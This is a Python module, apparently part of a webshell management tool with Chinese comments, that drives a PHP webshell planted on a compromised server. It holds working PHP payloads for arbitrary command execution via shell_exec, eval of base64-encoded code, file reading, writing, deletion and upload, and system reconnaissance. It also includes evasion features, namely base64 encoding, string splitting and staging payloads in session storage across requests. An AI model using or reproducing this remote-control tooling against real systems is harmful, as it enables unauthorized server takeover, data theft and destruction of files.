"""PHP Session的实现"""

import asyncio
import base64
import json
import logging
import random
import re
import string
import typing as t
import dataclasses
from binascii import Error as BinasciiError
import httpx
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

from . import exceptions

from ..utils import random_english_words, random_user_agent, random_data
from .base import (
    PHPSessionInterface,
    DirectoryEntry,
    BasicInfoEntry,
    register_session,
    ConnOption,
    ConnOptionGroup,
    get_http_client,
)

logger = logging.getLogger("sessions.php")

user_agent = random_user_agent()

DEFAULT_SESSION_ID = "".join(random.choices("1234567890abcdef", k=32))

DECODER_RAW = """
function decoder_echo($s) {echo $s;}
""".strip()

DECODER_BASE64 = """
function decoder_echo($s) {echo base64_encode($s);}
""".strip()

# session id was specified to avoid session
# forget to save session id in cookie

SUBMIT_WRAPPER_PHP = """\
if (session_status() == PHP_SESSION_NONE) {{
    session_id('{session_id}');
    session_start();
}}
{decoder}
echo '{delimiter_start_1}'.'{delimiter_start_2}';
try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}
echo '{delimiter_stop}';"""

LIST_DIR_PHP = """
error_reporting(0);
$folderPath = DIR_PATH;
$files = scandir($folderPath);
$result = array();
foreach ($files as $file) {
    $filePath = $folderPath . $file;
    $fileType = filetype($filePath);
    if($fileType == "link") {
        if(is_dir($filePath)) {
            $fileType = "link-dir";
        }else if(is_file($filePath)) {
            $fileType = "link-file";
        }else{
            $fileType = "unknown";
        }
    }
    array_push($result, array(
        "name" => basename($file),
        "type" => $fileType,
        "permission" => substr(decoct(fileperms($filePath)), -3),
        "filesize" => filesize($filePath)
    ));
}
decoder_echo(json_encode($result));
"""

GET_FILE_CONTENT_PHP = """
$filePath = FILE_PATH;
if(!is_file($filePath)) {
    decoder_echo("WRONG_NOT_FILE");
}
else if(!is_readable($filePath)) {
    decoder_echo("WRONG_NO_PERMISSION");
}
else if(filesize($filePath) > MAX_SIZE) {
    decoder_echo("WRONG_FILE_TOO_LARGE");
}else {
    $content = file_get_contents($filePath);
    decoder_echo(base64_encode($content));
}
"""

PUT_FILE_CONTENT_PHP = """
$filePath = FILE_PATH;
$fileContent = base64_decode(FILE_CONTENT);
if(!is_file($filePath) && is_writeable($filePath)) {
    decoder_echo("WRONG_NO_PERMISSION");
}else{
    $content = file_put_contents($filePath, $fileContent);
    decoder_echo("SUCCESS");
}
"""


DELETE_FILE_PHP = """
$filePath = FILE_PATH;
if(!is_file($filePath)) {
    decoder_echo("WRONG_NOT_FILE");
}else if(!is_writable($filePath)) {
    decoder_echo("WRONG_NO_PERMISSION");
}else {
    $result = unlink($filePath);
    if($result) {
        decoder_echo("SUCCESS");
    }else{
        decoder_echo("FAILED");
    }
}
"""

MOVE_FILE_PHP = """
$filePath = #FILEPATH#;
$newFilePath = #NEW_FILEPATH#;
if(!file_exists($filePath)) {
    decoder_echo("WRONG_NOT_EXIST");
}else if(!is_writeable($filePath)) {
    decoder_echo("WRONG_NO_PERMISSION");
}else {
    $result = rename($filePath, $newFilePath);
    if($result) {
        decoder_echo("SUCCESS");
    }else{
        decoder_echo("FAILED");
    }
}
"""

GET_BASIC_INFO_PHP = """
$infos = array();
array_push($infos, [
    "key" => "PHPVERSION",
    "value" => phpversion()
]);
array_push($infos, [
    "key" => "SYSTEMVERSION",
    "value" => php_uname()
]);
array_push($infos, [
    "key" => "CURRENT_FOLDER",
    "value" => getcwd()
]);
array_push($infos, [
    "key" => "CURRENT_PHP_SCRIPT",
    "value" => __FILE__
]);
array_push($infos, [
    "key" => "CURRENT_PHPINI",
    "value" => php_ini_loaded_file()
]);
array_push($infos, [
    "key" => "HTTP_SOFTWARE",
    "value" => $_SERVER['SERVER_SOFTWARE']
]);
array_push($infos, [
    "key" => "SERVER_ADDR",
    "value" => $_SERVER['SERVER_ADDR']
]);
array_push($infos, [
    "key" => "SERVER_PORT",
    "value" => $_SERVER['SERVER_PORT']
]);
try {
    $user=posix_getpwuid(posix_geteuid());
    $group = posix_getgrgid($user['gid']);
    array_push($infos, [
        "key" => "SERVER_USER",
        "value" => $user["name"]
    ]);
    array_push($infos, [
        "key" => "SERVER_GROUP",
        "value" => $group["name"]
    ]);
}catch(Exception $e) {}
array_push($infos, [
    "key" => "ENV_PATH",
    "value" => getenv('PATH')
]);
array_push($infos, [
    "key" => "INI_DISABLED_FUNCTIONS",
    "value" => ini_get('disable_functions')
]);
array_push($infos, [
    "key" => "EXTENSIONS",
    "value" => implode(", ", get_loaded_extensions())
]);
decoder_echo(json_encode($infos));
"""

DOWNLOAD_PHPINFO_PHP = """
ob_start();
phpinfo();
$content = ob_get_contents();
ob_end_clean();
decoder_echo(base64_encode($content));
"""

EVAL_PHP = """
eval(base64_decode({code_b64}));
"""

PAYLOAD_SESSIONIZE = """
$b64_part = 'B64_PART';
if(!$_SESSION['PAYLOAD_STORE']) {
    $_SESSION['PAYLOAD_STORE'] = array();
}
$_SESSION['PAYLOAD_STORE'][PAYLOAD_ORDER] = $b64_part;
"""

PAYLOAD_SESSIONIZE_TRIGGER = """
if(!$_SESSION['PAYLOAD_STORE']) {
    decoder_echo("PAYLOAD_SESSIONIZE_UNEXIST");
}else{
    $payload = "";
    $parts = $_SESSION['PAYLOAD_STORE'];
    for($i = 0; $i < count($parts); $i ++) {
        if(!$parts[$i]) {
            break;
        }
        $payload .= $parts[$i];
    }
    if($i != count($parts)) {
        decoder_echo("PAYLOAD_SESSIONIZE_UNEXIST");
    }else{
        $payload = ("base"."64_decode")($payload);
        eval($payload);
    }
}
unset($_SESSION['PAYLOAD_STORE']);
"""

PAYLOAD_SESSIONIZE_CHUNK = 5000

__all__ = [
    "PHPWebshell",
]

basic_info_names = {
    "PHPVERSION": "当前PHP版本",
    "SYSTEMVERSION": "系统版本",
    "CURRENT_FOLDER": "当前目录",
    "CURRENT_PHP_SCRIPT": "当前PHP脚本",
    "CURRENT_PHPINI": "当前php.ini位置",
    "HTTP_SOFTWARE": "当前HTTP服务器",
    "SERVER_ADDR": "服务器地址",
    "SERVER_PORT": "服务器端口",
    "SERVER_USER": "服务器用户",
    "SERVER_GROUP": "用户所在组",
    "ENV_PATH": "环境变量PATH",
    "INI_DISABLED_FUNCTIONS": "disabled_functions",
    "EXTENSIONS": "PHP扩展",
}


def base64_encode(s):
    """将给定的字符串或字节序列编码成base64"""
    if isinstance(s, str):
        s = s.encode("utf-8")
    return base64.b64encode(s).decode()


def to_sessionize_payload(
    payload: str, chunk: int = PAYLOAD_SESSIONIZE_CHUNK
) -> t.List[str]:
    payload = base64_encode(payload)
    payload_store_name = random_english_words()
    payloads = []
    for i in range(0, len(payload), chunk):
        part = payload[i : i + chunk]
        part = (
            PAYLOAD_SESSIONIZE.replace("PAYLOAD_ORDER", str(i))
            .replace("B64_PART", part)
            .replace("PAYLOAD_STORE", payload_store_name)
        )
        payloads.append(part)
    final = PAYLOAD_SESSIONIZE_TRIGGER.replace("PAYLOAD_STORE", payload_store_name)
    payloads.append(final)
    return payloads


# 给前端显示的PHPWebshellOptions选项
php_webshell_conn_options = [
    ConnOption(
        id="encoder",
        name="编码器",
        type="select",
        placeholder="base64",
        default_value="base64",
        alternatives=[
            {"name": "base64", "value": "base64"},
            {"name": "raw", "value": "raw"},
        ],
    ),
    ConnOption(
        id="decoder",
        name="解码器",
        type="select",
        placeholder="raw",
        default_value="raw",
        alternatives=[
            {"name": "raw", "value": "raw"},
            {"name": "base64", "value": "base64"},
        ],
    ),
    ConnOption(
        id="sessionize_payload",
        name="Session暂存payload",
        type="checkbox",
        placeholder=None,
        default_value=False,
        alternatives=None,
    ),
]


class PHPWebshell(PHPSessionInterface):
    """PHP session各类工具函数的实现"""

    def __init__(self, conn: t.Union[None, dict]):
        # conn是webshell从前端或者数据库接来的字典，可能是上一个版本，没有添加某项的connection info
        # 所以其中的任何一项都可能不存在，需要使用get取默认值
        options = conn if conn is not None else {}
        self.encoder = options.get("encoder", "raw")
        self.decoder = options.get("decoder", "raw")
        self.sessionize_payload = options.get("sessionize_payload", False)
        # for upload file
        self.chunk_size = 32 * 1024
        self.max_coro = 4

    def encode(self, payload: str) -> str:
        """应用编码器"""
        if self.encoder == "raw":
            return payload
        if self.encoder == "base64":
            encoded = base64.b64encode(payload.encode()).decode()
            return f'eval(base64_decode("{encoded}"));'
        raise RuntimeError(f"Unsupported encoder: {self.encoder}")

    def decode(self, output: str) -> str:
        if self.decoder == "raw":
            return output
        elif self.decoder == "base64":
            return base64.b64decode(output).decode("utf-8")
        raise RuntimeError(f"Unsupported encoder: {self.encoder}")

    async def execute_cmd(self, cmd: str) -> str:
        return await self.submit(f"decoder_echo(shell_exec({cmd!r}));")

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        dir_path = dir_path.removesuffix("/") + "/"
        php_code = LIST_DIR_PHP.replace("DIR_PATH", repr(dir_path))
        json_result = await self.submit(php_code)
        try:
            result = json.loads(json_result)
        except json.JSONDecodeError as exc:
            raise exceptions.UnknownError("JSON解析失败: " + json_result) from exc
        result = [
            DirectoryEntry(
                name=item["name"],
                permission=item["permission"],
                entry_type=(
                    item["type"]
                    if item["type"] in ["dir", "file", "link-dir", "link-file"]
                    else "unknown"
                ),
                filesize=item["filesize"],
            )
            for item in result
        ]
        if not any(entry.name == ".." for entry in result):
            result.insert(
                0,
                DirectoryEntry(
                    name="..", permission="555", filesize=-1, entry_type="dir"
                ),
            )
        return result

    async def get_file_contents(
        self, filepath: str, max_size: int = 1024 * 200
    ) -> bytes:
        php_code = GET_FILE_CONTENT_PHP.replace("FILE_PATH", repr(filepath)).replace(
            "MAX_SIZE", str(max_size)
        )
        result = await self.submit(php_code)
        if result == "WRONG_NOT_FILE":
            raise exceptions.FileError("目标不是一个文件")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("没有权限读取这个文件")
        if result == "WRONG_FILE_TOO_LARGE":
            raise exceptions.FileError(f"文件大小太大(>{max_size}B)，建议下载编辑")
        return base64.b64decode(result)

    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
        php_code = PUT_FILE_CONTENT_PHP.replace("FILE_PATH", repr(filepath)).replace(
            "FILE_CONTENT", repr(base64_encode(content))
        )
        result = await self.submit(php_code)
        if result == "WRONG_NOT_FILE":
            raise exceptions.FileError("目标不是一个文件")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("没有权限保存这个文件")
        return result == "SUCCESS"

    async def delete_file(self, filepath: str) -> bool:
        php_code = DELETE_FILE_PHP.replace("FILE_PATH", repr(filepath))
        result = await self.submit(php_code)
        if result == "WRONG_NOT_FILE":
            raise exceptions.FileError("目标不是一个文件")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("没有权限保存这个文件")
        return result == "SUCCESS"

    async def move_file(self, filepath: str, new_filepath: str) -> None:
        php_code = MOVE_FILE_PHP.replace("#FILEPATH#", repr(filepath)).replace(
            "#NEW_FILEPATH#", repr(new_filepath)
        )
        result = await self.submit(php_code)
        if result == "WRONG_NOT_EXIST":
            raise exceptions.FileError("目标不存在")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("没有权限移动这个文件")
        if result == "FAILED":
            raise exceptions.UnknownError("因未知原因移动失败")
        if result != "SUCCESS":
            raise exceptions.UnknownError("目标没有反馈移动成功")

    async def upload_file(
        self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
    ) -> bool:
        sem = asyncio.Semaphore(self.max_coro)
        chunk_size = self.chunk_size
        done_count = 0
        coros = []

        async def upload_chunk(chunk: bytes):
            nonlocal done_count
            code = """
            $file = tempnam("", "");
            $content = base64_decode('BASE64_CONTENT');
            file_put_contents($file, $content);
            decoder_echo($file);
            """.replace(
                "    ", ""
            ).replace(
                "BASE64_CONTENT", base64_encode(chunk)
            )
            async with sem:
                await asyncio.sleep(0.01)  # we don't ddos
                result = await self.submit(code)
                done_count += 1
                if callback:
                    callback(done_count / len(coros))
            return result

        coros = [
            upload_chunk(content[i : i + chunk_size])
            for i in range(0, len(content), chunk_size)
        ]
        uploaded_chunks = await asyncio.gather(*coros)
        code = """
        $files = json_decode(FILES);
        $content = "";
        $readerror = false;
        foreach($files as &$file) {
            if(!file_exists($file)) {
                $readerror = true;
            }
            if(!$readerror) {
                $content = $content . file_get_contents($file);
            }
            @unlink($file);
        }
        if(file_exists(FILENAME) && !is_writeable(FILENAME)) {
            decoder_echo("WRONG_NO_PERMISSION");
        }
        else if(!file_exists(FILENAME) && !is_writeable(dirname(FILENAME))) {
            decoder_echo("WRONG_NO_PERMISSION_DIR");
        }
        else if($readerror) {
            decoder_echo("WRONG_READ_ERROR");
        }else{
            file_put_contents(FILENAME, $content);
            decoder_echo("DONE");
        }

        """.replace(
            "FILES", repr(json.dumps(uploaded_chunks))
        ).replace(
            "FILENAME", repr(filepath)
        )
        result = await self.submit(code)
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("没有权限写入这个文件")
        if result == "WRONG_NO_PERMISSION_DIR":
            raise exceptions.FileError("没有权限写入这个文件夹")
        if result == "WRONG_READ_ERROR":
            raise exceptions.FileError("无法读取上传的暂存文件，难道是被删了？")
        return result == "DONE"

    async def get_pwd(self) -> str:
        return await self.submit("decoder_echo(__DIR__);")

    async def test_usablility(self) -> bool:
        first_string, second_string = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        try:
            result = await self.submit(
                f"decoder_echo('{first_string}' . '{second_string}');"
            )
        except exceptions.NetworkError:
            return False
        return (first_string + second_string) in result

    async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
        json_result = await self.submit(GET_BASIC_INFO_PHP)
        try:
            raw_result = json.loads(json_result)
            result = [
                {
                    "key": (
                        basic_info_names[entry["key"]]
                        if entry["key"] in basic_info_names
                        else entry["key"]
                    ),
                    "value": entry["value"],
                }
                for entry in raw_result
            ]
            return result
        except json.JSONDecodeError as exc:
            raise exceptions.UnknownError("解析目标返回的JSON失败") from exc

    async def download_phpinfo(self) -> bytes:
        """获取当前的phpinfo文件"""
        b64_result = await self.submit(DOWNLOAD_PHPINFO_PHP)
        try:
            return base64.b64decode(b64_result)
        except BinasciiError as exc:
            raise exceptions.UnknownError("base64解码接收到的数据失败") from exc

    async def _submit(self, payload: str) -> str:
        """将php payload通过encoder编码后提交"""
        start, stop = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        payload = SUBMIT_WRAPPER_PHP.format(
            delimiter_start_1=start[:3],
            delimiter_start_2=start[3:],
            delimiter_stop=stop,
            payload_raw=payload,
            session_id=DEFAULT_SESSION_ID,
            decoder={"raw": DECODER_RAW, "base64": DECODER_BASE64}[self.decoder],
        )
        payload = self.encode(payload)
        status_code, text = await self.submit_raw(payload)
        if status_code == 404:
            raise exceptions.UnknownError(
                f"受控端返回404, 没有这个webshell: {status_code}"
            )
        if status_code != 200:
            raise exceptions.UnknownError(
                f"受控端返回了不正确的HTTP状态码: {status_code}"
            )
        if "POSTEXEC_FAILED" in text:
            raise exceptions.UnknownError("payload被执行，但运行失败")
        idx_start = text.find(start)
        if idx_start == -1:
            raise exceptions.UnknownError(
                "找不到输出文本的开头，也许webshell没有执行代码？"
            )
        idx_stop_r = text[idx_start:].find(stop)
        if idx_stop_r == -1:
            raise exceptions.UnknownError("找不到输出文本的结尾")
        idx_stop = idx_stop_r + idx_start
        output = text[idx_start + len(start) : idx_stop]
        output = self.decode(output)
        return output

    async def submit(self, payload: str) -> str:
        # sessionize_payload
        payloads = [payload]
        if self.sessionize_payload:
            payloads = to_sessionize_payload(payload)
        result = None
        for payload_part in payloads:
            result = await self._submit(payload_part)
            if result == "PAYLOAD_SESSIONIZE_UNEXIST":
                raise exceptions.UnknownError(
                    "Session中不存在payload，是不是不支持Session？"
                )
        return result

    async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
        """提交原始php payload

        Args:
            payload (str): 需要提交的payload

        Returns:
            t.Union[t.Tuple[int, str], None]: 返回的结果，要么为状态码和响应正文，要么为None
        """
        raise NotImplementedError("这个函数应该由实际的实现override")

    async def php_eval(self, code: str) -> str:
        result = await self.submit(EVAL_PHP.format(code_b64=repr(base64_encode(code))))
        return result